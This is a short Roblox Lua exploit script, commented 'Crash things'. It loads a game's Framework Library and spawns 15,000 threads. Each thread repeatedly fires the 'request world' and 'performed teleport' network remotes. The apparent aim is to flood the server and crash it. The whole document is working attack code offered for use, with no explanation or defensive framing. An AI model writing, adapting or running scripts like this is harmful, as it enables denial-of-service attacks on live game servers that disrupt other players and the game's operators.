do--//Crash things
Library = require(game:GetService('ReplicatedStorage').Framework.Library)
function Death()
spawn(function()
Library.Network.Fire('request world', "Fantasy")
Library.Network.Fire('performed teleport')
end)
spawn(function()
Library.Network.Fire('request world', "Tech")
Library.Network.Fire('performed teleport')
end)
end
for i=1,15000 do
spawn(function()
Death()
end)
end
end
